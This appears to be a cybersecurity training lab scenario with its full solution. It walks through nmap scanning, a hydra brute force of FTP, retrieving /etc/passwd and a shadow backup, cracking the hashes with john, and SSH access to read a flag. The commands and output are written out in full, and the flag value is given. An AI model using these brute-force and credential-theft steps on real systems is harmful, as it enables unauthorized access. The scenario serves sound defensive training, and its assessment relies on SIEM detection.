# Password Cracking Scenario
The aim of this scenario is to familiarize participants with common
security issues in operating systems by performing offensive tasks
such as reconnaissance and password cracking. Trainees will be able to
obtain insecure user credentials through brute-force attacks,
eventually getting SSH access to a victim system. 

The scenario simulates an company internal network and is composed of:

+ A previously compromised Linux machine (A), with the required attack
  tools.
+ A victim workstation (V) to use as target of the attack.


The user will use two common brute force tools:
+ [John the Ripper](http://www.openwall.com/john)
+ [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)

## Scenario objective:

Get SSH access to the victim and obtain the file `flag.txt` located in
the homedir of the user used to connect to the machine.

## Scenario resolution
The necessary steps to solve the scenario are as follows:

1. **Reconnaissance:** The first step is to do basic reconnaissance to
   discover services provided by the victim:
   ```console
   trainee01@attacker$ nmap 10.0.1.5
   Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-28 13:43 UTC
   Nmap scan report for ip-10-0-1-5.ec2.internal (10.0.1.5)
   Host is up (0.0019s latency).
   Not shown: 998 closed ports
   PORT   STATE SERVICE
   21/tcp open  ftp
   22/tcp open  ssh

   Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
   ```
2. **Compile a list of possible usernames:** Using the information
   obtained from the company web site, found in `employees.html`,
   compile a list of possible usernames. The first user (crackable
   with `hydra`) is among the employees without a published email
   address, so trainees will have to fill out this information for all
   users, making an educated guess as to the username assignment
   policy.

3. **Find the first user (FTP):** Port-scanning shows that the victim
   offers the FTP service. Perform a brute-force attack with `hydra`,
   using the generated username list and options `-e nsr` to try
   passwords equal to the username, the reverse, and empty:
   ```console
   trainee01@attacker$ hydra -L userlist -ensr ftp://10.0.1.5
   [...]
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 696 login tries (l:232/p:3), ~44 tries per task
   [DATA] attacking ftp://10.0.1.5:21/
	   [21][ftp] host: 10.0.1.5  login: halagia   password: halagia
   [...]
   1 of 1 target successfully completed, 1 valid password found
   ```

   Since this user has no shell, it can only be used to connect to the
   FTP service. Through the FTP service one can download the
   `/etc/passwd` file, since the service is not isolated correctly (no
   chroot), and a backup of the shadow file `shadow.bak`:
   ```console
   trainee01@attacker$ ssh halagia@10.0.1.5
   halagia@10.0.1.5's password: 
   Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
   [...]
   This account is currently not available.
   Connection to 10.0.1.5 closed.
  
   trainee01@attacker$ ftp ftp://halagia:halagia@10.0.1.5
   Connected to 10.0.1.5.
   220 (vsFTPd 3.0.5)
   331 Please specify the password.
   230 Login successful.
   Remote system type is UNIX.
   Using binary mode to transfer files.
   200 Switching to Binary mode.
   ftp> ls
   229 Entering Extended Passive Mode (|||54914|)
   150 Here comes the directory listing.
   -rw-r--r--    1 1001     1001         1721 Oct 31 20:56 shadow.bak
   226 Directory send OK.
   ftp> get shadow.bak
   local: shadow.bak remote: shadow.bak
   229 Entering Extended Passive Mode (|||29207|)
   150 Opening BINARY mode data connection for shadow.bak (2305 bytes).
   100% |**************************|  1721       27.47 MiB/s    00:00 ETA
   226 Transfer complete.
   1721 bytes received in 00:00 (2.47 MiB/s)
   ftp> cd /etc
   250 Directory successfully changed.
   ftp> get passwd
   local: passwd remote: passwd
   229 Entering Extended Passive Mode (|||19306|)
   150 Opening BINARY mode data connection for passwd (2307 bytes).
   100% |**************************|  2307       27.50 MiB/s    00:00 ETA
   226 Transfer complete.
   2307 bytes received in 00:00 (1.29 MiB/s)
   ftp> exit
   221 Goodbye.
   ```
    
4. **Crack the second user:** Using the `unshadow` command,
   combine the information from the passwd and shadow files:
   ```console
   trainee01@attacker$ unshadow passwd shadow.bak > tocrack
   trainee01@attacker$ cat tocrack
   ...
   mmentesa:$6$rounds=656000$bimfuxpo$RptBix...:1004:1004:Maria J. Mentesana:/home/mmentesa:/bin/bash
   halagia:$6$rounds=656000$bvvdpknf$AA1j2y4...:1005:1005:Humberto R. Alagia:/home/halagia:/usr/sbin/nologin
   ```

   Using the unshadowed file, crack the remaining password with john:
   ```console
   trainee01@attacker$ john --single tocrack
   Created directory: /home/trainee01/.john
   Loaded 2 password hashes with 2 different salts [...]
   halagia           (halagia)
   mariamentesana!   (mmentesa)
   ```

   John immediately finds the FTP user password *halagia* (that is the
   same as the username), and a few seconds later, *mmentesa*'s that
   is based on their gecos information. This user has SSH access to
   the victim. The flag can be found in their homedir:
   ```console
   trainee01@attacker$ ssh mmentesa@10.0.1.5
   mmentesa@10.0.1.5's password: 
   Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1012-aws x86_64)
   [...]
   mmentesa@victim-1$ cat flag.txt
   ~^4%l93sh1nb-5|ge6*&w+8[()<@mda0
   ```

## Assessment

The assessment is based on a set of Elastic Security SIEM rules. 
As students progress through the resolution, they will generate alerts based on key events identified by these rules. 
The alerts can be analyzed from the Security - Alerts menu in Kibana.









